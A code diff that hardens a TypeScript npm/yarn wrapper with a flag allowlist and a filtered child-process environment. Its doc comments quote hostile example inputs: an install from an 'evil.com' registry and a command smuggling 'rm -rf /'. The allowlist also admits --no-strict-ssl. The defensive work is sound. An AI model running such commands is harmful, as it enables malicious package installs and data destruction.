@@ -20,6 +20,101 @@ import { IntegrityChecker } from '../core/integrity-checker.js'
 const logger = getModuleLogger()
 
 /**
+ * Whitelist of safe npm arguments
+ * Security: Only allow known-safe flags to prevent argument injection
+ */
+const SAFE_NPM_FLAGS = new Set([
+  '--prefer-offline',
+  '--no-save-exact',
+  '--save-exact',
+  '--audit',
+  '--save-dev',
+  '--save',
+  '--no-save',
+  '--legacy-peer-deps',
+  '--no-strict-ssl',
+  '--progress',
+  '--force',
+  '--no-fund',
+  '--fund',
+])
+
+/**
+ * Validates npm arguments to prevent flag injection attacks
+ * Only allows whitelisted flags; rejects unknown flags starting with --
+ *
+ * @param args - Arguments to validate
+ * @returns Error if invalid, null if valid
+ *
+ * @security
+ * Prevents: `npm install --registry=https://evil.com pkg`
+ * Prevents: `npm install pkg; rm -rf /`
+ *
+ * @example
+ * ```typescript
+ * const error = validateNpmArguments(['--save-dev', '--prefer-offline'])
+ * // Returns: null (valid)
+ *
+ * const error = validateNpmArguments(['--registry=https://evil.com'])
+ * // Returns: 'Dangerous argument: --registry=https://evil.com'
+ * ```
+ */
+function validateNpmArguments(args: string[]): string | null {
+  for (const arg of args) {
+    if (arg.startsWith('--')) {
+      // Extract the flag name (everything before =)
+      const flagName = arg.split('=')[0] ?? arg
+      if (!SAFE_NPM_FLAGS.has(flagName)) {
+        return `Dangerous argument: ${arg}`
+      }
+    }
+  }
+
+  return null
+}
+
+/**
+ * Creates a safe environment for npm/yarn/pnpm operations
+ * Only includes essential variables, filters out secrets
+ *
+ * @security
+ * Prevents leakage of: NPM_TOKEN, GH_TOKEN, AWS_KEY, AWS_SECRET_ACCESS_KEY, etc.
+ * Allows: PATH, HOME, NODE_ENV, LANG, LC_ALL
+ *
+ * @returns Safe environment object
+ */
+function createSafeEnvironment(): Record<string, string> {
+  // Whitelist of safe environment variables
+  const SAFE_ENV_VARS = [
+    'PATH',
+    'HOME',
+    'NODE_ENV',
+    'LANG',
+    'LC_ALL',
+    'SHELL',
+    'USER',
+    'TMPDIR',
+    'TEMP',
+    'TMP',
+  ]
+
+  const safeEnv: Record<string, string> = {}
+
+  for (const key of SAFE_ENV_VARS) {
+    const value = process.env[key]
+    if (value) {
+      safeEnv[key] = value
+    }
+  }
+
+  // Add essential npm config (safe values only)
+  safeEnv['npm_config_yes'] = 'true'
+  safeEnv['YARN_ENABLE_IMMUTABLE_INSTALLS'] = 'false'
+
+  return safeEnv
+}
+
+/**
  * Options pour l'installation de packages
  */
 export interface InstallOptions {
@@ -220,6 +315,17 @@ export async function installPackages(
       throw new Error('Command is empty')
     }
 
+    // SEC-001: Validate npm arguments to prevent flag injection
+    const error = validateNpmArguments(args)
+    if (error) {
+      logger.error(error)
+      return {
+        success: false,
+        packages,
+        error,
+      }
+    }
+
     // Add security options to npm args
     const securityArgs = ['--prefer-offline', '--no-save-exact']
     if (packageManager === 'npm') {
@@ -227,17 +333,12 @@ export async function installPackages(
       args.push('--audit')
     }
 
-    // Execute with timeout protection and resource limits
+    // SEC-002: Use safe environment (whitelist sensitive vars)
     const resultPromise = execa(cmd, args, {
       cwd,
       stdio: silent ? 'pipe' : 'inherit',
       maxBuffer: RESOURCE_LIMITS.MAX_BUFFER,
-      env: {
-        ...process.env,
-        // Désactiver les prompts interactifs
-        npm_config_yes: 'true',
-        YARN_ENABLE_IMMUTABLE_INSTALLS: 'false',
-      },
+      env: createSafeEnvironment(),
     })
 
     const result = await withTimeout(
@@ -327,11 +428,24 @@ export async function uninstallPackages(
       throw new Error('Command is empty')
     }
 
+    // SEC-001: Validate npm arguments to prevent flag injection
+    const error = validateNpmArguments(args)
+    if (error) {
+      logger.error(error)
+      return {
+        success: false,
+        packages,
+        error,
+      }
+    }
+
+    // SEC-002: Use safe environment (whitelist sensitive vars)
     // Execute with timeout protection and resource limits
     const resultPromise = execa(cmd, args, {
       cwd,
       stdio: 'inherit',
       maxBuffer: RESOURCE_LIMITS.MAX_BUFFER,
+      env: createSafeEnvironment(),
     })
 
     const result = await withTimeout(
@@ -402,11 +516,23 @@ export async function runScript(
       throw new Error('Command is empty')
     }
 
+    // SEC-001: Validate npm arguments to prevent flag injection
+    const error = validateNpmArguments(args)
+    if (error) {
+      logger.error(error)
+      return {
+        success: false,
+        error,
+      }
+    }
+
+    // SEC-002: Use safe environment (whitelist sensitive vars)
     // Execute with timeout protection and resource limits
     const resultPromise = execa(cmd, args, {
       cwd,
       stdio: 'inherit',
       maxBuffer: RESOURCE_LIMITS.MAX_BUFFER,
+      env: createSafeEnvironment(),
     })
 
     const result = await withTimeout(
